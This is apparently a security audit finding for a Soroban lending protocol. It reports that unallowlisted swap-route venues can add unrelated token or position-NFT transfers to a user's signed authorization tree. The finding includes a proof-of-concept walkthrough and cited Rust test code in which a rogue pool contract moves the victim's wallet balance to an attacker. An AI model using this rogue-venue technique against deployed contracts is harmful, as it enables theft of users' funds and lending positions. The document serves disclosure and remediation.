### Title
Unconfined route venues can abuse the caller auth tree to seize wallet assets or positions - (File: contracts/controller/src/lib.rs)

### Summary
Medium severity authorization-scope violation. Route-selected contracts called below account-strategy entrypoints can request unrelated authorization from the account owner, causing simulation to add malicious token or position-NFT transfers beneath the caller’s signed invocation.

### Finding Description
`swap_collateral` accepts attacker-influenced `swap` bytes and executes the route while `caller` authorization is active [1](#0-0) . Route venues are not allowlisted, so a malicious contract named by the route can execute arbitrary code during the strategy [2](#0-1) .

That venue can invoke an unrelated contract call requiring the caller’s authorization, such as `token.transfer(caller, attacker, amount)` or `position_nft.transfer(caller, attacker, account_id)`. Soroban does not treat the root authorization as sufficient by itself; however, simulation records the malicious call as a child authorization, and the host executes it if the caller signs the expanded tree [3](#0-2) . The repository’s enforcing-auth test confirms that the malicious transfer succeeds when the poisoned child is signed [4](#0-3) .

Transferring a position NFT moves control of the complete lending account, including its collateral and debt, not merely an inert collectible [5](#0-4) .

### Impact Explanation
An attacker can steal unrelated tokens held by the caller or take ownership of the caller’s position NFT and then withdraw any collateral permitted by the transferred account’s solvency checks. A debt-free or sufficiently collateralized position can therefore be drained after its NFT is moved to the attacker. This is theft of user funds rather than merely a bad swap execution.

### Likelihood Explanation
The attacker must induce the victim to submit a malicious route and sign a transaction whose authorization tree contains the extra call. Opaque XDR routes and incomplete wallet presentation make this plausible, while a wallet that clearly displays or validates all child invocations can prevent it. The required user interaction and signing requirement limit the finding to Medium severity.

### Recommendation
Do not allow arbitrary route-selected contracts to execute under user strategy authorization. Restrict venues to governance-approved implementations and deploy a transaction-builder check that rejects any caller authorization tree containing calls beyond the expected collateral transfer and venue invocations. Client documentation should explicitly compare the simulated authorization tree against an expected allowlist before signing.

### Proof of Concept
1. Alice owns lending account `A` and holds an unrelated token `T`.
2. An attacker deploys contract `RogueVenue` whose swap-compatible entrypoint calls `T.transfer(alice, attacker, balance)` and/or `PositionNft.transfer(alice, attacker, A)`.
3. The attacker gives Alice strategy bytes that route through `RogueVenue`.
4. Alice invokes `controller.swap_collateral(caller=alice, account_id=A, ..., swap=malicious_route)`.
5. Simulation records the malicious transfer as a child of Alice’s `swap_collateral` authorization; submitting that signed tree authorizes and executes the unrelated transfer.
6. The strategy can still produce valid output, while Alice loses `T` or ownership of account `A`.

This behavior is concretely exercised by `RogueHopPool` and the auth-tree tests in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` [6](#0-5) .

### Citations

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/position-nft/README.md (L39-41)
```markdown
Transferring the token transfers the whole position. Nothing in the controller
changes on transfer: the next controller call resolves the new holder and
accepts it. Collateral and debt both move with the token.
```
